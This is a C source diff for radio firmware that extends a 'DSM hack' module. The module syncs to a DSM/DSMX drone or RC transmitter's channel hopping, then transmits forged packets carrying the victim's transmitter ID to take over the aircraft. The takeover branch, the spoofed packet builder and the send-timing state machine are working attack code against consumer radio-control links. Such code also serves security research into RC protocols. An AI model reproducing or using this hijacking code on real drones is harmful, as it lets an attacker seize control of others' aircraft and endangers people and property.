@@ -37,7 +37,7 @@ static void protocol_dsm_hack_start(void);
 static void protocol_dsm_hack_stop(void);
 static void protocol_dsm_hack_run(void);
 static void protocol_dsm_hack_status(void);
-static void protocol_dsm_hack_parse_arg(uint8_t *arg, uint16_t len, uint16_t offset, uint16_t tot_len);
+static void protocol_dsm_hack_parse_arg(uint8_t type, uint8_t *arg, uint16_t len, uint16_t offset, uint16_t tot_len);
 
 /* Main protocol structure */
 struct protocol_t protocol_dsm_hack = {
@@ -54,7 +54,9 @@ struct protocol_t protocol_dsm_hack = {
 /* Internal functions */
 static void protocol_dsm_hack_timer(void);
 static void protocol_dsm_hack_receive(bool error);
+static void protocol_dsm_hack_send(bool error);
 static void protocol_dsm_hack_next(void);
+static void protocol_dsm_build_packet(void);
 
 /* Internal variables */
 static enum dsm_hack_status_t dsm_hack_status;		//*< The current status of the hacking */
@@ -67,8 +69,13 @@ static uint8_t data_col;													//*< Data column number */
 static uint16_t crc_seed;													//*< The current crc_seed */
 static uint8_t missed_packets;										//*< The amount of missed packets since last receive */
 static uint16_t succ_packets;											//*< Amount of succesfully received packets */
-static bool recv_time_short;											//*< Wheter to use the short AB timeing */
+static bool recv_time_short;											//*< Whether to use the short AB timeing */
 static uint8_t pkt_throttle;											//*< Transmitting packet throttleing to PC */
+static uint16_t time_chana;												//*< The last receive time of channel A */
+static uint16_t time_chanb;												//*< The last receive time of channel B */
+static bool start_takeover;												//*< If we need to start taking over the drone */
+static bool is_11bit;															//*< If the channels need to be encoded in 11bits */
+static uint8_t transmit_packet[16];								//*< The packet to transmit */
 
 /**
  * Configure the CYRF chip and antenna switcher
@@ -77,6 +84,14 @@ static void protocol_dsm_hack_init(void) {
 	uint8_t mfg_id[6];
 	// Stop the timer
 	timer1_stop();
+
+	// Initialize variables
+	dsm_hack_status = DSM_HACK_SYNC;
+	chan_idx = 0;
+	pkt_throttle = 0;
+	recv_time_short = false;
+	start_takeover = false;
+	is_11bit = false;
 
 #ifdef CYRF_DEV_ANT
 	// Switch the antenna to the CYRF
@@ -97,7 +112,7 @@ static void protocol_dsm_hack_init(void) {
 	// Set the callbacks
 	timer1_register_callback(protocol_dsm_hack_timer);
 	cyrf_register_recv_callback(protocol_dsm_hack_receive);
-	cyrf_register_send_callback(NULL);
+	cyrf_register_send_callback(protocol_dsm_hack_send);
 
 	console_print("\r\nDSM Hack initialized 0x%02X 0x%02X 0x%02X 0x%02X", mfg_id[0], mfg_id[1], mfg_id[2], mfg_id[3]);
 }
@@ -106,6 +121,9 @@ static void protocol_dsm_hack_init(void) {
  * Deinitialize the variables
  */
 static void protocol_dsm_hack_deinit(void) {
+	timer1_register_callback(NULL);
+	cyrf_register_recv_callback(NULL);
+	cyrf_register_send_callback(NULL);
 	console_print("\r\nDSM Hack deinitialized");
 }
 
@@ -115,10 +133,12 @@ static void protocol_dsm_hack_deinit(void) {
 static void protocol_dsm_hack_start(void) {
 	int i = 0;
 	// Start to synchronize with the transmitter
-	dsm_hack_status = DSM_RECEIVER_SYNC;
+	dsm_hack_status = DSM_HACK_SYNC;
 	chan_idx = 0;
 	pkt_throttle = 0;
 	recv_time_short = false;
+	start_takeover = false;
+	is_11bit = false;
 
 	// Calculate the crc_seed, sop_col and data_col based on the transmitter ID
 	crc_seed = ~((txid[0] << 8) + txid[1]);
@@ -172,45 +192,98 @@ static void protocol_dsm_hack_status(void) {
 /**
  * Parse arguments given to the DSM hacker
  */
-static void protocol_dsm_hack_parse_arg(uint8_t *arg, uint16_t len, uint16_t offset, uint16_t tot_len) {
-	if(offset != 0 || len != 7 || tot_len != 7)
-		return;
+static void protocol_dsm_hack_parse_arg(uint8_t type, uint8_t *arg, uint16_t len, uint16_t offset, uint16_t tot_len) {
+	if(type == PROTOCOL_START) {
+		if(offset != 0 || len != 7 || tot_len != 7)
+			return;
 
-	is_dsmx = arg[0];
-	memcpy(txid, arg+1, 4);
-	memcpy(channels, arg+5, 2);
+		is_dsmx = arg[0];
+		memcpy(txid, arg+1, 4);
+		memcpy(channels, arg+5, 2);
+	}
+	else if(type == PROTOCOL_EXTRA) {
+		if(offset != 0 || len != 2 || tot_len != 2)
+			return;
+
+		start_takeover = arg[0];
+		is_11bit = arg[1];
+	}
 }
 
 
 static void protocol_dsm_hack_timer(void) {
-	// Abort the receive
-	cyrf_abort_recv();
 
-	// Goto the next channel
-	protocol_dsm_hack_next();
-	cyrf_start_recv();
+	switch(dsm_hack_status) {
+		/* We are trying to synchronize with the transmitter */
+		case DSM_HACK_SYNC:
+			recv_time_short = false;
+			succ_packets = 0;
 
-	//console_print("T%d",channels[chan_idx]);
+			// Goto the next channel
+			cyrf_abort_recv();
+			protocol_dsm_hack_next();
+			cyrf_start_recv();
 
-	if(dsm_hack_status == DSM_RECEIVER_SYNC || missed_packets > 2) {
-		dsm_hack_status = DSM_RECEIVER_SYNC;
-		recv_time_short = false;
-		succ_packets = 0;
-		timer1_set(DSM_SYNC_RECV_TIME);
-	}
-	else {
-		missed_packets++;
+			timer1_set(DSM_SYNC_RECV_TIME);
+			break;
 
-		if(dsm_hack_status == DSM_RECEIVER_RECV_A) {
+		/* We were trying to receive at channel A */
+		case DSM_HACK_RECV_A:
+			// If we missed too many packets goto synchronize again
+			if(missed_packets > 3) {
+				dsm_hack_status = DSM_HACK_SYNC;
+				timer1_set(DSM_SYNC_RECV_TIME);
+				break;
+			}
+
+			// Goto the next channel
+			cyrf_abort_recv();
+			protocol_dsm_hack_next();
+			cyrf_start_recv();
+
 			timer1_set(DSM_RECV_TIME_B);
-			dsm_hack_status = DSM_RECEIVER_RECV_B;
-		} else if(recv_time_short) {
-			timer1_set(DSM_RECV_TIME_A_SHORT);
-			dsm_hack_status = DSM_RECEIVER_RECV_A;
-		} else {
-			timer1_set(DSM_RECV_TIME_A);
-			dsm_hack_status = DSM_RECEIVER_RECV_A;
-		}
+			dsm_hack_status = DSM_HACK_RECV_B;
+			break;
+
+		/* We were trying to receive at channel B */
+		case DSM_HACK_RECV_B:
+			// If we missed too many packets goto synchronize again
+			if(missed_packets > 3) {
+				dsm_hack_status = DSM_HACK_SYNC;
+				timer1_set(DSM_SYNC_RECV_TIME);
+				break;
+			}
+
+			// Goto the next channel
+			cyrf_abort_recv();
+			protocol_dsm_hack_next();
+			cyrf_start_recv();
+
+			// Determine the time based on received packets
+			if(recv_time_short)
+				timer1_set(DSM_RECV_TIME_A_SHORT);
+			else
+				timer1_set(DSM_RECV_TIME_A);
+			dsm_hack_status = DSM_HACK_RECV_A;
+			break;
+
+		/* We are transmitting channel A */
+		case DSM_HACK_SEND_A:
+			timer1_set(time_chanb+20);
+			protocol_dsm_build_packet();
+
+			cyrf_send_len(transmit_packet, 16);
+			dsm_hack_status = DSM_HACK_SEND_B;
+			break;
+
+		/* We are transmitting channel B */
+		case DSM_HACK_SEND_B:
+			timer1_set(time_chana+20);
+
+			cyrf_send_len(transmit_packet, 16);
+			dsm_hack_status = DSM_HACK_SEND_A;
+			break;
+
 	}
 }
 
@@ -246,7 +319,7 @@ static void protocol_dsm_hack_receive(bool error) {
 			if(error && rx_status & CYRF_BAD_CRC)
 				crc_seed = ~crc_seed;
 
-			// Go to the next channel (and reset timer)
+			// Go to the next channel
 			protocol_dsm_hack_next();
 			missed_packets = 0;
 
@@ -255,18 +328,40 @@ static void protocol_dsm_hack_receive(bool error) {
 				succ_packets = succ_packets < 5000? (succ_packets + 1): 5000;
 				//console_print("S%d",channels[chan_idx]);
 
+				// Start takeover
+				if(succ_packets > 15) {
+					cyrf_start_transmit();
+					protocol_dsm_build_packet();
+					console_print("\r\nS %d %d", time_chana, time_chanb);
+
+					if(dsm_hack_status == DSM_HACK_RECV_A) {
+						dsm_hack_status = DSM_HACK_SEND_B;
+						timer1_set(time_chanb);
+					}
+					else {
+						dsm_hack_status = DSM_HACK_SEND_A;
+						timer1_set(time_chana);
+					}
+
+					return;
+				}
+
+				// Set the timer to the correct values
 				if(succ_packets > 1 && timer < DSM_RECV_TIME_B) {
-					dsm_hack_status = DSM_RECEIVER_RECV_A;
+					time_chanb = timer+60;
+					dsm_hack_status = DSM_HACK_RECV_A;
 					if(recv_time_short)
 						timer1_set(DSM_RECV_TIME_A_SHORT);
 					else
 						timer1_set(DSM_RECV_TIME_A);
 				} else if(succ_packets > 2 && timer < DSM_RECV_TIME_A_SHORT) {
+					time_chana = timer+60;
 					recv_time_short = true;
-					dsm_hack_status = DSM_RECEIVER_RECV_B;
+					dsm_hack_status = DSM_HACK_RECV_B;
 					timer1_set(DSM_RECV_TIME_B);
-				} else if(succ_packets > 2 && timer < DSM_RECV_TIME_A) {
-					dsm_hack_status = DSM_RECEIVER_RECV_B;
+				} else {
+					time_chana = timer+60;
+					dsm_hack_status = DSM_HACK_RECV_B;
 					timer1_set(DSM_RECV_TIME_B);
 				}
 			} else {
@@ -289,10 +384,38 @@ static void protocol_dsm_hack_receive(bool error) {
 }
 
 /**
+ * Whenever a packet has been send
+ */
+static void protocol_dsm_hack_send(bool error) {
+	cyrf_start_transmit();
+	protocol_dsm_hack_next();
+	//console_print("S");
+}
+
+/**
  * Go to the next channel for scanning
  */
 static void protocol_dsm_hack_next(void) {
 	chan_idx = is_dsmx? (chan_idx + 1) % DSM_MAX_USED_CHANNELS : (chan_idx + 1) % 2;
 	crc_seed = ~crc_seed;
 	dsm_set_channel(channels[chan_idx], !is_dsmx, sop_col, data_col, crc_seed);
+}
+
+/**
+ * Build the transmitting packet
+ */
+static void protocol_dsm_build_packet(void) {
+	if(is_dsmx) {
+		transmit_packet[0] = txid[2];
+		transmit_packet[1] = txid[3];
+	} else {
+		transmit_packet[0] = ~txid[2];
+		transmit_packet[1] = ~txid[3];
+	}
+
+	for(uint8_t i = 0; i < 7; i++) {
+		uint16_t value = i << 11 | 1000;
+		transmit_packet[i*2 + 2] = value >> 8;
+		transmit_packet[i*2 + 3] = value & 0xFF;
+	}
 }
